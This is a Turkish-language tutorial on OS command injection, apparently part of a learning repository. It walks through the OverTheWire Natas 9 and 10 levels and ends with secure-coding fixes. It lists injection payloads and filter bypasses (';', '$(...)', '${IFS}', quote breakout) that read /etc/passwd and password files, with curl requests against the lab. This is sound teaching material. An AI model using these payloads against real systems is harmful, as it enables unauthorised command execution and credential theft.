# 🌐 Web Güvenliği — Command Injection

> Uygulama kullanıcı girdisini alıp doğrudan shell komutuna ekliyorsa,
> sen bir komut değil iki komut gönderebilirsin.

---

## 📋 İçindekiler

- [Command Injection Nedir?](#command-injection-nedir)
- [Shell Operatörleri](#shell-operatörleri)
- [PHP'de Tehlikeli Fonksiyonlar](#phpdeki-tehlikeli-fonksiyonlar)
- [Filtre Bypass Teknikleri](#filtre-bypass-teknikleri)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Command Injection Nedir?

Uygulama, kullanıcıdan aldığı bir değeri doğrudan bir shell komutunun içine gömdüğünde ortaya çıkar.

```php
// Tehlikeli kod:
$kelime = $_GET['kelime'];
passthru("grep -r $kelime /var/log/");
```

Kullanıcı `natas` yazarsa sunucu şunu çalıştırır:

```bash
grep -r natas /var/log/
```

Normal. Ama kullanıcı `natas; cat /etc/passwd` yazarsa:

```bash
grep -r natas /var/log/; cat /etc/passwd
#                       ↑
#           ikinci komut eklendi — çalışır!
```

Sunucu iki komutu da çalıştırır ve `/etc/passwd` içeriğini ekrana basar.

---

## Shell Operatörleri

Komutları birleştirmek için kullanılan shell operatörleri, command injection'ın temelidir.

| Operatör | Sözdizimi | Ne Zaman Çalışır |
|----------|-----------|------------------|
| `;` | `cmd1; cmd2` | Her zaman (cmd1 başarısız olsa bile) |
| `&&` | `cmd1 && cmd2` | Sadece cmd1 başarılıysa |
| `\|\|` | `cmd1 \|\| cmd2` | Sadece cmd1 başarısızsa |
| `\|` | `cmd1 \| cmd2` | cmd1 çıktısını cmd2'ye pipe eder |
| `` `cmd` `` | `` echo `id` `` | cmd'nin çıktısını yerleştirir |
| `$(cmd)` | `echo $(id)` | cmd'nin çıktısını yerleştirir (modern) |
| `\n` | `cmd1%0acmd2` | Yeni satır — bazı filtreleri atlatır |

### Örnekler

```bash
# Noktalı virgül — her iki komutu çalıştır
natas; id

# Çıktıyı birleştir
natas | cat /etc/natas_webpass/natas10

# Sadece ikinci komutu çalıştır
nothing || cat /etc/natas_webpass/natas10

# Komut yerleştirme
$(cat /etc/natas_webpass/natas10)
```

---

## PHP'de Tehlikeli Fonksiyonlar

```php
// Kullanıcı girdisi doğrudan komuta gidiyor — hepsi tehlikeli
system("grep $input /var/log/");
passthru("grep $input /var/log/");
exec("grep $input /var/log/");
shell_exec("grep $input /var/log/");

// Backtick operatörü — exec ile aynı
$output = `grep $input /var/log/`;
```

### Fark Nedir?

| Fonksiyon | Çıktı | Döndürür |
|-----------|-------|----------|
| `system()` | Ekrana basar | Son satır |
| `passthru()` | Ekrana basar (binary safe) | Yok |
| `exec()` | Ekrana **basmaz** | Son satır |
| `shell_exec()` | Ekrana **basmaz** | Tüm çıktı |

Natas 9 ve 10'da `passthru` kullanılır — çıktı doğrudan ekrana gelir.

---

## Filtre Bypass Teknikleri

Uygulama bazı karakterleri filtreleyebilir. Natas 10 buna güzel bir örnek.

### Natas 9 — Filtresiz

```php
$key = $_REQUEST['needle'];
passthru("grep -i $key dictionary.txt");
```

Herhangi bir shell operatörü çalışır:

```
Girdi: . /etc/natas_webpass/natas10
Komut: grep -i . /etc/natas_webpass/natas10 dictionary.txt
       → şifreyi ekrana basar
```

`.` karakteri grep'te "her karakterle eşleş" anlamına gelir — dosyayı tamamen okur.

### Natas 10 — Filtreleme Var

```php
$key = $_REQUEST['needle'];

// ; | & karakterlerini filtrele
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

`;`, `|`, `&` karakterleri yasak. Ama `. /etc/natas_webpass/natas10` hâlâ çalışır çünkü bu karakterleri kullanmıyor.

```
Girdi: . /etc/natas_webpass/natas10
Komut: grep -i . /etc/natas_webpass/natas10 dictionary.txt
```

grep iki dosyayı da tarıyor ve her iki dosyadaki her satırı `.` ile eşleştiriyor.

### Yaygın Bypass Yöntemleri

**1. Alternatif ayırıcılar**

```bash
# ; filtreleniyorsa yeni satır dene
cmd1%0acmd2          # URL encoded newline
```

**2. Filtrelenmeyen operatörler**

```bash
# & filtreleniyorsa || dene (veya tersi)
cmd1 || cmd2
```

**3. grep'in özelliklerini kullanmak**

```bash
# grep -i PATTERN FILE1 FILE2 ... şeklinde birden fazla dosya alır
# Dictionary.txt yerine hedef dosyayı ver
. /etc/natas_webpass/natas10
#↑ grep pattern'i: her karakterle eşleş
#  /etc/natas_webpass/natas10: bu dosyayı da tara
```

**4. Tırnak içine almak (quoting)**

Bazı durumlarda girdi tırnak içinde olur:

```php
passthru("grep -i '$key' dictionary.txt");
//                 ↑   ↑
//           tek tırnak içinde
```

Bypass için tırnaktan çık:

```
Girdi: '; cat /etc/passwd; echo '
Komut: grep -i ''; cat /etc/passwd; echo '' dictionary.txt
```

**5. Boşluk alternatifi**

Boşluk filtreleniyorsa:

```bash
cat${IFS}/etc/passwd      # $IFS = Internal Field Separator (boşluk)
cat</etc/passwd           # yönlendirme ile
{cat,/etc/passwd}         # brace expansion
```

---

## Natas'ta Kullanım

### Natas 9 — Temel Command Injection

**Kaynak kod:**

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

**Exploit:**

Herhangi bir şifreyi okumak için grep'e dosya olarak ver:

```
Girdi: . /etc/natas_webpass/natas10
```

Bu şu komutu çalıştırır:

```bash
grep -i . /etc/natas_webpass/natas10 dictionary.txt
```

Sonuç: `/etc/natas_webpass/natas10` içindeki her satır ekrana gelir.

**curl ile:**

```bash
curl -u natas9:[şifre] \
     "http://natas9.natas.labs.overthewire.org/?needle=.+/etc/natas_webpass/natas10&submit=Search"
```

---

### Natas 10 — Filtreli Command Injection

**Kaynak kod:**

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

**Analiz:** `;`, `|`, `&` yasak — ama aynı trick hâlâ çalışıyor.

```
Girdi: . /etc/natas_webpass/natas11
Komut: grep -i . /etc/natas_webpass/natas11 dictionary.txt
```

Yasak karakterlerin hiçbirini kullanmadık.

**curl ile:**

```bash
curl -u natas10:[şifre] \
     "http://natas10.natas.labs.overthewire.org/?needle=.+/etc/natas_webpass/natas11&submit=Search"
```

---

### Güvenli Kod Nasıl Olmalı?

```php
// KÖTÜ — direkt concatenation
passthru("grep $input dictionary.txt");

// İYİ — escapeshellarg ile escape et
$safe = escapeshellarg($input);
passthru("grep $safe dictionary.txt");

// DAHA İYİ — shell kullanma, PHP fonksiyonunu kullan
$contents = file_get_contents('dictionary.txt');
$lines = explode("\n", $contents);
$results = array_filter($lines, fn($line) => str_contains($line, $input));
```

`escapeshellarg()` → Girdiyi tek tırnak içine alır, içindeki tek tırnakları escape eder.
`escapeshellcmd()` → Shell meta karakterlerini escape eder (ama daha zayıf).

---

### Command Injection — Kontrol Listesi

```
Kaynak kodda kontrol et:
  ☐ system(), passthru(), exec(), shell_exec() var mı?
  ☐ Kullanıcı girdisi ($GET, $POST, $COOKIE) komuta gidiyor mu?
  ☐ escapeshellarg() veya escapeshellcmd() kullanılıyor mu?
  ☐ Hangi karakterler filtreleniyor?
  ☐ Filtrelenmeyenlerle ne yapılabilir?

Dene:
  ☐ ; id                      → komut ayırıcı
  ☐ | id                      → pipe
  ☐ && id                     → ve
  ☐ || id                     → veya
  ☐ $(id)                     → command substitution
  ☐ . /etc/natas_webpass/...  → grep trick
```

---

## 🔗 Kaynaklar

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

**Önceki konu:** [06_encoding_ve_obfuscation.md](./06_encoding_ve_obfuscation.md)
**Sonraki konu:** [08_lfi_ve_path_traversal.md](./08_lfi_ve_path_traversal.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
